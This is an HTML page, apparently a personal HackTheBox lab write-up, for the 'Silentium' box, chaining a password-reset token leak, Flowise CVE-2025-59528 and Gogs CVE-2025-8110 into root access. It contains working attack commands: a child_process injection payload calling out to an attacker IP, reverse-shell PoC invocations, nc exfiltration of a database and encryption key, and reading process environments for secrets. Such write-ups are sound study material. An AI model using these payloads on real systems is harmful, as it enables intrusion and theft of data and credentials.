@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Silentium | Zakir Hussain</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+:root{
+  --bg:#0a0e17;
+  --bg-elev:#0e1420;
+  --bg-card:#111827;
+  --bg-code:#0b1018;
+  --border:#1e2838;
+  --border-soft:#172030;
+  --text:#dbe4ef;
+  --text-dim:#8b98ac;
+  --text-faint:#5b6678;
+  --accent:#2dd4a7;
+  --accent-soft:rgba(45,212,167,.12);
+  --accent-2:#38bdf8;
+  --warn:#f59e0b;
+  --danger:#ef4444;
+  --easy:#2dd4a7;
+  --medium:#f5a623;
+  --hard:#ef5a6f;
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+@media (prefers-color-scheme: light){
+  :root{ color-scheme: dark; }
+}
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;}
+body{
+  background:
+    radial-gradient(1100px 500px at 15% -5%, rgba(45,212,167,.07), transparent 60%),
+    radial-gradient(900px 500px at 100% 0%, rgba(56,189,248,.05), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--accent-soft); color:var(--text);}
+a{color:var(--accent-2); text-decoration:none;}
+a:hover{text-decoration:underline;}
+.wrap{max-width:860px; margin:0 auto; padding:0 24px 96px;}
+
+/* ---------- topbar ---------- */
+.topbar{
+  border-bottom:1px solid var(--border-soft);
+  background:rgba(10,14,23,.85);
+  backdrop-filter:blur(8px);
+  position:sticky; top:0; z-index:20;
+}
+.topbar-inner{
+  max-width:860px; margin:0 auto; padding:14px 24px;
+  display:flex; align-items:center; justify-content:space-between;
+  gap:12px; flex-wrap:wrap;
+}
+.back-link{
+  font-family:var(--mono); font-size:13px; color:var(--text-dim);
+  display:flex; align-items:center; gap:6px;
+}
+.back-link:hover{color:var(--accent); text-decoration:none;}
+.brand{
+  font-family:var(--mono); font-size:13px; color:var(--text-faint); letter-spacing:.03em;
+}
+
+/* ---------- hero ---------- */
+.hero{padding:48px 0 28px; border-bottom:1px solid var(--border-soft);}
+.eyebrow{
+  font-family:var(--mono); font-size:12.5px; color:var(--accent);
+  letter-spacing:.04em; margin:0 0 14px;
+  display:flex; align-items:center; gap:8px;
+}
+.eyebrow::before{content:"//"; color:var(--text-faint);}
+h1.machine-title{
+  font-family:var(--mono); font-weight:700; font-size:clamp(32px,6vw,48px);
+  margin:0 0 14px; color:#fff; letter-spacing:-.01em;
+}
+.badges{display:flex; flex-wrap:wrap; gap:8px; margin-bottom:20px;}
+.badge{
+  font-family:var(--mono); font-size:12px; padding:5px 11px; border-radius:5px;
+  border:1px solid var(--border); background:var(--bg-card); color:var(--text-dim);
+  display:inline-flex; align-items:center; gap:6px;
+}
+.badge.diff-Easy{color:var(--easy); border-color:rgba(45,212,167,.35); background:rgba(45,212,167,.08);}
+.badge.diff-Medium{color:var(--medium); border-color:rgba(245,166,35,.35); background:rgba(245,166,35,.08);}
+.badge.diff-Hard{color:var(--hard); border-color:rgba(239,90,111,.35); background:rgba(239,90,111,.08);}
+.badge.os{color:var(--accent-2);}
+.synopsis{color:var(--text-dim); font-size:16px; max-width:70ch; margin:0;}
+.tags{display:flex; flex-wrap:wrap; gap:6px; margin-top:18px;}
+.tag{
+  font-family:var(--mono); font-size:11.5px; color:var(--text-faint);
+  border:1px solid var(--border-soft); padding:3px 9px; border-radius:999px;
+}
+
+/* ---------- info table ---------- */
+.info-grid{
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+  gap:1px; background:var(--border-soft); border:1px solid var(--border-soft);
+  border-radius:10px; overflow:hidden; margin:28px 0 8px;
+}
+.info-cell{background:var(--bg-card); padding:14px 16px;}
+.info-cell .k{font-family:var(--mono); font-size:11px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.06em; margin-bottom:4px;}
+.info-cell .v{font-family:var(--mono); font-size:14px; color:var(--text);}
+
+/* ---------- section ---------- */
+section.phase{padding:40px 0; border-bottom:1px solid var(--border-soft);}
+section.phase:last-of-type{border-bottom:none;}
+.phase-head{display:flex; align-items:baseline; gap:12px; margin-bottom:6px;}
+.phase-num{font-family:var(--mono); color:var(--accent); font-size:14px;}
+h2.phase-title{font-family:var(--mono); font-size:22px; margin:0; color:#fff; font-weight:700;}
+.phase-intro{color:var(--text-dim); margin:10px 0 22px; max-width:72ch;}
+
+.step{margin:22px 0;}
+.step-title{
+  font-family:var(--mono); font-size:14.5px; color:var(--text); font-weight:700;
+  margin:0 0 4px; display:flex; align-items:center; gap:8px;
+}
+.step-title::before{content:"▸"; color:var(--accent);}
+.why{
+  font-size:14.5px; color:var(--text-dim); margin:6px 0 10px; padding-left:18px;
+  border-left:2px solid var(--border-soft);
+}
+.why b{color:var(--accent); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+pre{
+  background:var(--bg-code); border:1px solid var(--border);
+  border-radius:8px; padding:14px 16px; overflow-x:auto;
+  font-family:var(--mono); font-size:13px; line-height:1.55; margin:10px 0;
+  color:#c9d6e8;
+}
+pre.cmd{border-left:3px solid var(--accent);}
+pre.out{border-left:3px solid var(--accent-2); color:#9fb0c3;}
+code{font-family:var(--mono); font-size:.92em;}
+.inline-code{background:var(--bg-code); border:1px solid var(--border); border-radius:4px; padding:1px 6px; color:var(--accent); font-size:.88em;}
+
+.next{font-size:14.5px; color:var(--text-dim); margin:10px 0 0; padding-left:18px; border-left:2px solid rgba(56,189,248,.35);}
+.next b{color:var(--accent-2); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+.callout{
+  border:1px solid var(--border); border-left:3px solid var(--warn);
+  background:rgba(245,166,35,.06); border-radius:8px; padding:14px 18px; margin:18px 0;
+}
+.callout.cve{border-left-color:var(--danger); background:rgba(239,90,111,.06);}
+.callout .ctitle{font-family:var(--mono); font-size:12.5px; color:var(--warn); text-transform:uppercase; letter-spacing:.05em; margin-bottom:6px; font-weight:700;}
+.callout.cve .ctitle{color:var(--danger);}
+.callout p{margin:0; color:var(--text-dim); font-size:14.5px;}
+
+.flagbox{
+  font-family:var(--mono); background:var(--bg-code); border:1px dashed var(--border);
+  border-radius:8px; padding:12px 16px; margin:10px 0; display:flex; align-items:center; gap:10px;
+  font-size:13.5px; color:var(--accent);
+}
+.flagbox .lbl{color:var(--text-faint); font-size:11px; text-transform:uppercase; letter-spacing:.06em;}
+
+table.vulns{width:100%; border-collapse:collapse; margin:14px 0; font-size:14px;}
+table.vulns th, table.vulns td{border:1px solid var(--border-soft); padding:9px 12px; text-align:left;}
+table.vulns th{background:var(--bg-card); font-family:var(--mono); font-size:11.5px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.05em;}
+table.vulns td{color:var(--text-dim);}
+
+.chain{
+  font-family:var(--mono); font-size:12.5px; color:var(--text-dim);
+  background:var(--bg-code); border:1px solid var(--border); border-radius:8px;
+  padding:16px; overflow-x:auto; white-space:pre; margin:20px 0;
+}
+
+ul.rec-list{margin:10px 0; padding-left:0; list-style:none;}
+ul.rec-list li{
+  padding:8px 0 8px 26px; position:relative; color:var(--text-dim); font-size:14.5px;
+  border-bottom:1px solid var(--border-soft);
+}
+ul.rec-list li:last-child{border-bottom:none;}
+ul.rec-list li::before{content:"→"; position:absolute; left:0; color:var(--accent);}
+
+.summary-box{
+  background:var(--bg-card); border:1px solid var(--border); border-radius:10px;
+  padding:22px 24px; margin:24px 0;
+}
+.summary-box h3{font-family:var(--mono); font-size:15px; color:#fff; margin:0 0 10px;}
+
+footer.page-footer{
+  padding:40px 0 10px; text-align:center; color:var(--text-faint); font-family:var(--mono); font-size:12.5px;
+}
+footer.page-footer a{color:var(--text-dim);}
+.foot-nav{margin-bottom:14px;}
+
+@media (max-width:600px){
+  .wrap{padding:0 16px 72px;}
+  h1.machine-title{font-size:30px;}
+}
+
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-inner">
+    <a class="back-link" href="https://zak5886.github.io/Portfolio/#writeups">&larr; back to writeups</a>
+    <span class="brand">ZAKIR_HUSSAIN / HTB_WRITEUPS</span>
+  </div>
+</div>
+<div class="wrap">
+
+<div class="hero">
+  <p class="eyebrow">HTB_WRITEUP // silentium.log</p>
+  <h1 class="machine-title">Silentium</h1>
+  <div class="badges"><span class="badge diff-Easy">Easy</span><span class="badge os">Linux</span></div>
+  <p class="synopsis">Silentium is an “institutional finance” branded box that turns out to be a chain of application-layer misconfigurations rather than a single flashy exploit: a hidden staging vhost, a leaky password-reset API that discloses tempTokens, a vulnerable Flowise AI-builder instance (CVE-2025-59528), and finally a self-hosted Gogs Git service (CVE-2025-8110) reachable only after pivoting through internal ports.</p>
+  <div class="tags"><span class="tag">nmap</span><span class="tag">vhost-fuzzing</span><span class="tag">ffuf</span><span class="tag">api-abuse</span><span class="tag">idor</span><span class="tag">broken-auth</span><span class="tag">flowise</span><span class="tag">cve-2025-59528</span><span class="tag">burp-repeater</span><span class="tag">gogs</span><span class="tag">cve-2025-8110</span><span class="tag">jwt</span><span class="tag">mailhog</span><span class="tag">ssh-tunnelling</span><span class="tag">git-rce</span></div>
+</div>
+<div class="info-grid"><div class="info-cell"><div class="k">Target</div><div class="v">Silentium</div></div><div class="info-cell"><div class="k">Difficulty</div><div class="v">Easy</div></div><div class="info-cell"><div class="k">OS</div><div class="v">Linux</div></div><div class="info-cell"><div class="k">Primary Vuln</div><div class="v">Broken Password-Reset Flow</div></div><div class="info-cell"><div class="k">Secondary</div><div class="v">Flowise CVE-2025-59528</div></div><div class="info-cell"><div class="k">Priv-Esc Path</div><div class="v">Gogs CVE-2025-8110 (RCE)</div></div></div>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 1</span></div>
+  <h2 class="phase-title">Reconnaissance & Virtual Host Discovery</h2>
+  <p class="phase-intro">Port scan first to understand the attack surface, then fuzz for the virtual hosts the main site is hiding behind &mdash; staging/internal subdomains are frequently where the real app logic (and the real bugs) live.</p>
+  
+<div class="step">
+  <p class="step-title">Service & OS scan</p>
+  <p class="why"><b>Why</b>A combined version/script scan with OS detection gives both the open-port picture and useful fingerprinting in one pass.</p>
+  <pre class="cmd">nmap -sV -A -T4 10.129.30.114 -o port_scan</pre>
+  <pre class="out">22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
+80/tcp open  http  nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/</pre>
+  <p class="next"><b>Next</b>Only SSH and HTTP are exposed &mdash; so the entire attack surface is the web application. Add the hostname to /etc/hosts and start enumerating it.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Virtual host fuzzing</p>
+  <p class="why"><b>Why</b>The landing page is a static marketing site for a fictional finance firm with almost nothing interactive. Rather than directory-bust a mostly-static page, I fuzzed the <code>Host</code> header for hidden subdomains &mdash; a much higher-yield technique when a company site looks like a shell.</p>
+  <pre class="cmd">ffuf -c -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" \
+  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --fs 178</pre>
+  <pre class="out">[Status: 200, Size: 3142] staging</pre>
+  <p class="next"><b>Next</b>A staging vhost responds differently from the baseline &mdash; add staging.silentium.htb to the hosts file and inspect it directly.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Manual discovery of the registration flow</p>
+  <p class="why"><b>Why</b>Browsing staging.silentium.htb by hand (rather than only relying on automated fuzzing) surfaced a <code>/register</code> page the brochure site didn't link to &mdash; worth remembering that manual exploration still finds things wordlists miss.</p>
+  
+  
+  <p class="next"><b>Next</b>The frontend signup form didn't behave as expected in the browser, so move to driving the backend API directly with curl.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 2</span></div>
+  <h2 class="phase-title">API Enumeration & Endpoint Mapping</h2>
+  <p class="phase-intro">The frontend form silently failed, which is a strong signal the real logic lives behind an API the SPA calls separately. Replaying the same request with curl, and then fuzzing for sibling endpoints, is the standard way to work around a broken or JS-gated frontend.</p>
+  
+<div class="step">
+  <p class="step-title">Replay the signup request with curl</p>
+  <p class="why"><b>Why</b>Reproducing the browser's request manually, with the headers it normally sends automatically (<code>Origin</code>, <code>Referer</code>, a custom internal-trust header), tests whether the API enforces those headers server-side or just expects them cosmetically.</p>
+  <pre class="cmd">curl -X POST "http://staging.silentium.htb/api/v1/auth/register" \
+-H "Content-Type: application/json" \
+-H "x-request-from: internal" \
+-H "Origin: http://staging.silentium.htb" \
+-H "Referer: http://staging.silentium.htb/signup" \
+-d '{"fullName":"Mario Rossi","email":"velid@velid.com","password":"Password1!","confirmPassword":"Password1!"}'</pre>
+  
+  <p class="next"><b>Next</b>A direct account was created, confirming the frontend's client-side validation wasn't backed by matching server-side checks. Check the Network tab for the real API prefix used by the live login flow.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Fuzz the real API surface</p>
+  <p class="why"><b>Why</b>The working login traffic revealed the true path prefix (<code>/api/v1/...</code>), which is different from the one that worked for registration &mdash; a sign the API has multiple route groups. Fuzzing against a dedicated API wordlist surfaces every other route the SPA doesn't expose through its own UI.</p>
+  <pre class="cmd">ffuf -c -u http://staging.silentium.htb/FUZZ -w \
+  /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt --fs 3142</pre>
+  <pre class="out">api/v1/account/forgot-password
+api/v1/account/reset-password
+api/v1/account/user/register
+api/v1/auth/login
+...(many more, mostly 401-gated)</pre>
+  <p class="next"><b>Next</b>Every endpoint found here is logged for later use. The password-reset pair (forgot-password / reset-password) stands out as the highest-value target, since reset flows are a classic source of logic bugs.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 3</span></div>
+  <h2 class="phase-title">Account Takeover via Password-Reset Token Disclosure</h2>
+  <p class="phase-intro">The site's Leadership page names a real employee, <strong>Ben</strong>. Rather than brute-forcing credentials, I targeted the password-reset flow directly and intercepted it with Burp to see exactly what the server returns.</p>
+  <div class="callout"><div class="ctitle">The core bug</div><p>The <code>forgot-password</code> endpoint responds with a <strong>201 Created</strong> and echoes the full user object back in the JSON body &mdash; including the freshly generated <code>tempToken</code> that's supposed to be delivered privately (normally by email). Any unauthenticated caller who knows a target's email address receives their own valid reset token in the HTTP response.</p></div>
+<div class="step">
+  <p class="step-title">Trigger the reset and capture the response</p>
+  <p class="why"><b>Why</b>Requesting a reset for Ben's email, while watching the raw response in Burp rather than trusting what the frontend renders, is what reveals the leak &mdash; the UI never shows the token, but the API response contains it in full.</p>
+  <pre class="cmd">curl -X POST "http://staging.silentium.htb/api/v1/account/forgot-password" \
+-H "Content-Type: application/json" \
+-H "Accept: application/json, text/plain, */*" \
+-d '{"user":{"email":"ben@silentium.htb"}}'</pre>
+  <pre class="out">HTTP/1.1 201 Created
+{
+  "user": {
+    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
+    "name": "admin",
+    "email": "ben@silentium.htb",
+    "tempToken": "7W1Z6KxQMvDEqgjmQge7KQ4uBp2IP3G7ARlFbk77SHRFmu4EnrQoTWzw1zT7W4ue",
+    "tokenExpiry": "2026-04-14T20:32:46.172Z",
+    "status": "active"
+  }
+}</pre>
+  <p class="next"><b>Next</b>This tempToken is exactly what the real reset-password endpoint expects. Use it immediately before it expires.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Set a new password with the leaked token</p>
+  <p class="why"><b>Why</b>Feeding the disclosed <code>tempToken</code> back into <code>reset-password</code> completes a full account takeover with no access to Ben's email inbox at any point.</p>
+  <pre class="cmd">curl -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
+-H "Content-Type: application/json" \
+-d '{"user":{"email":"ben@silentium.htb","tempToken":"&lt;leaked-token&gt;","password":"MyPassword123"}}'</pre>
+  <pre class="out">HTTP/1.1 201 Created &amp;mdash; tempToken field now empty, password hash updated</pre>
+  <p class="next"><b>Next</b>Log in to the application as Ben with the new password and continue enumerating what an authenticated admin session can reach.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 4</span></div>
+  <h2 class="phase-title">Shell via Flowise &mdash; CVE-2025-59528</h2>
+  <p class="phase-intro">Authenticated as Ben, the app's dashboard exposed an embedded Flowise instance (an AI agent/LLM workflow builder). Flowise's custom-node loading feature is a known unauthenticated-adjacent RCE vector once a session token is available.</p>
+  <div class="callout cve"><div class="ctitle">CVE-2025-59528 &mdash; Flowise CustomMCP Node RCE</div><p>Flowise's <code>/api/v1/node-load-method/customMCP</code> endpoint evaluates a user-supplied <code>mcpServerConfig</code> expression server-side. By supplying a JavaScript object literal that calls <code>process.mainModule.require('child_process').execSync(...)</code> inside that config, an authenticated caller gets direct command execution on the Flowise host.</p></div>
+<div class="step">
+  <p class="step-title">Recover the session JWT</p>
+  <p class="why"><b>Why</b>Flowise authenticates via a JWT issued at login; grabbing it from the browser (or the login response in Burp) is needed to authorize the exploit request.</p>
+  
+  
+  <p class="next"><b>Next</b>Use the JWT as a Bearer token against the vulnerable node-load-method endpoint.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Trigger RCE through the customMCP node</p>
+  <p class="why"><b>Why</b>The payload abuses Node's module loader to reach <code>child_process</code> from inside the sandboxed evaluation context, then runs an arbitrary shell command &mdash; in this case, an outbound <code>curl</code> as a callback/verification check before sending a full reverse shell.</p>
+  <pre class="cmd">curl -X POST "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer &lt;JWT&gt;" \
+-H "x-request-from: internal" \
+-d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\\"child_process\\");cp.execSync(\\"curl 10.10.14.184:8000\\");return 1;})()})"}}'</pre>
+  
+  <p class="next"><b>Next</b>With command execution confirmed, swap the probe command for a full reverse shell payload.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Get an interactive shell</p>
+  <p class="why"><b>Why</b>A purpose-built PoC script (CVE-2025-59528-POC) automates authentication and delivers bash / nc / python reverse shells in one pass &mdash; faster and more reliable than hand-crafting each payload during a live engagement.</p>
+  <pre class="cmd">python3 exploit.py -t http://staging.silentium.htb --mode revshell \
+  --lhost 10.10.15.154 --lport 9091 \
+  --email "ben@silentium.htb" --password "MyPassword123"</pre>
+  <pre class="out">root@silentium:/workspace# whoami
+root</pre>
+  <p class="next"><b>Next</b>This lands as root inside the Flowise container, not necessarily the underlying host. Loot the Flowise data directory for anything reusable.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Exfiltrate the Flowise database and encryption key</p>
+  <p class="why"><b>Why</b>Flowise stores its credential store, chatflow configs, and API keys in a local SQLite DB, encrypted with a local key file. Both are needed together to decrypt any stored secrets.</p>
+  <pre class="cmd">nc -w 3 10.10.15.154 9092 &lt; database.sqlite
+nc -w 3 10.10.15.154 9092 &lt; encryption.key</pre>
+  
+  <p class="next"><b>Next</b>Inspect the SQLite DB for a credential table, and separately check the process environment for anything leaked at runtime.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Mine the process environment for plaintext secrets</p>
+  <p class="why"><b>Why</b>Reading <code>/proc/&lt;pid&gt;/environ</code> for the Flowise process is a fast way to recover credentials that were passed in as environment variables rather than stored encrypted &mdash; a common oversight in containerized deployments.</p>
+  <pre class="cmd">strings /proc/$(pgrep -f flowise)/environ 2&gt;/dev/null | grep -i "secret\|key\|pass"</pre>
+  <pre class="out">FLOWISE_USERNAME=ben
+FLOWISE_PASSWORD=F1l3_d0ck3r
+SMTP_PASSWORD=r04D!!_R4ge
+DATABASE_PATH=/root/.flowise</pre>
+  <p class="next"><b>Next</b>Both the Flowise password and the earlier web password belong to ben &mdash; try the newly recovered one over SSH to the host itself.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 5</span></div>
+  <h2 class="phase-title">Pivoting &mdash; Internal Services & Gogs RCE (CVE-2025-8110)</h2>
+  <p class="phase-intro">SSH as ben on the real host opened up internal-only services that weren't reachable from outside &mdash; a classic multi-hop box pattern: compromise the app, land on the box, then pivot to services bound to localhost.</p>
+  
+<div class="step">
+  <p class="step-title">SSH in with the recovered password</p>
+  <p class="why"><b>Why</b>The Docker-environment password recovered from Flowise's process environment also worked for the host's SSH account.</p>
+  <pre class="cmd">ssh ben@silentium.htb</pre>
+  <pre class="out">Welcome to Ubuntu 24.04.4 LTS
+ben@silentium:~$ ls
+user.txt</pre>
+  <p class="next"><b>Next</b>Grab user.txt, then check what's listening locally that wasn't visible from the external scan.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Enumerate local-only listeners</p>
+  <p class="why"><b>Why</b><code>netstat -tulnp</code> as ben shows services bound to <code>127.0.0.1</code> on non-standard ports &mdash; these are the internal tools the staging environment depends on (mail capture, a code host) that are never meant to be internet-facing.</p>
+  <pre class="cmd">netstat -tulnp</pre>
+  <pre class="out">127.0.0.1:3000   LISTEN
+127.0.0.1:8025   LISTEN</pre>
+  <p class="next"><b>Next</b>Forward both ports over SSH to inspect them from the attack host's browser.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Tunnel the internal ports</p>
+  <p class="why"><b>Why</b>Local port forwarding exposes the loopback-only services on the attacking machine without touching the target's firewall rules at all.</p>
+  <pre class="cmd">ssh -L 3000:localhost:8025 ben@silentium.htb
+# separately: ssh -L 3001:localhost:3000 ben@silentium.htb</pre>
+  
+  <p class="next"><b>Next</b>Port 8025 is a MailHog instance (a mail-catcher used by dev/staging environments); port 3000 is an internal Gogs git server.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Discover the internal Gogs instance</p>
+  <p class="why"><b>Why</b>The forwarded port serves a self-hosted Gogs Git service at a separate internal hostname (<code>staging-v2-code.dev.silentium.htb</code>) &mdash; a secondary application stack that was never meant to be reachable except from inside the staging network.</p>
+  
+  
+  <p class="next"><b>Next</b>Fingerprint the Gogs version and check for known CVEs before attempting any exploit.</p>
+</div>
+
+  
+</section>
+<div class="callout cve"><div class="ctitle">CVE-2025-8110 &mdash; Gogs Malicious Symlink RCE</div><p>Gogs allows a repository push that includes a crafted symlink entry. By pushing a commit containing a malicious symlink via the Gogs API/git protocol, an authenticated (even low-privilege) user can escape the repo sandbox and achieve code execution on the Gogs host &mdash; in this case via a public PoC (<code>gogs-CVE-2025-8110</code>) that automates account registration, token generation, repo creation, and the malicious push/callback sequence.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 6</span></div>
+  <h2 class="phase-title">Root Shell via Gogs Exploit</h2>
+  <p class="phase-intro">With the internal Gogs service identified and version-fingerprinted as vulnerable, register an account through the standard signup flow and run the public PoC against it.</p>
+  
+<div class="step">
+  <p class="step-title">Configure git identity for the exploit</p>
+  <p class="why"><b>Why</b>The PoC drives real git operations, so a local git identity is required before it can commit and push the malicious payload.</p>
+  <pre class="cmd">git config --global user.email "vel@vel.vel"
+git config --global user.name "vel"</pre>
+  
+  
+</div>
+
+<div class="step">
+  <p class="step-title">Run the Gogs symlink RCE PoC</p>
+  <p class="why"><b>Why</b>The script authenticates to the forwarded Gogs instance, creates an application token, spins up a new repository, and pushes a commit containing the malicious symlink that triggers execution on the server side.</p>
+  <pre class="cmd">python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.154 -lp 9091</pre>
+  
+  <p class="next"><b>Next</b>Have a listener ready on the chosen port before triggering the exploit, since the callback fires asynchronously.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Catch the callback</p>
+  <p class="why"><b>Why</b>The exploit's malicious symlink gets processed server-side during a subsequent repository operation, triggering the reverse shell back to the listener.</p>
+  <pre class="cmd">nc -lvnp 9091</pre>
+  <pre class="out">Ncat: Connection from 10.129.43.86.
+bash: cannot set terminal process group ... no job control
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/5#</pre>
+  <p class="next"><b>Next</b>This lands directly as root &mdash; Gogs' own service account was running with root privileges inside the staging environment, so no further privilege escalation chain was required.</p>
+</div>
+
+  
+</section>
+<div class="summary-box"><h3>Key Takeaways</h3><ul class="rec-list"><li>Password-reset endpoints should never echo the reset token in an API response body &mdash; delivery must happen exclusively through the registered out-of-band channel (email/SMS), and the response should confirm nothing more than "if this account exists, a reset was sent."</li><li>Third-party platforms embedded into an app (here, Flowise) inherit the trust boundary of whatever account can reach them &mdash; a compromised low-privilege web account escalated straight to RCE because the AI-builder component itself was unpatched (CVE-2025-59528).</li><li>Secrets passed via environment variables to containerized services are trivially recoverable by anyone who gets code execution inside that container &mdash; use a secrets manager or mounted files with tight permissions instead.</li><li>Internal developer tooling (Gogs, MailHog) bound to loopback is only as safe as the host it runs on; once an attacker has a shell, "internal-only" stops being a real boundary. Keep internal tooling patched exactly as rigorously as internet-facing services.</li></ul></div>
+<footer class="page-footer">
+  <div class="foot-nav"><a href="https://zak5886.github.io/Portfolio/#writeups">&larr; All writeups</a> &nbsp;|&nbsp; <a href="https://zak5886.github.io/Portfolio/">Portfolio home</a></div>
+  Educational penetration testing writeup &middot; HackTheBox lab environment &middot; &copy; 2026 Zakir Hussain
+</footer>
+</div>
+</body>
+</html>
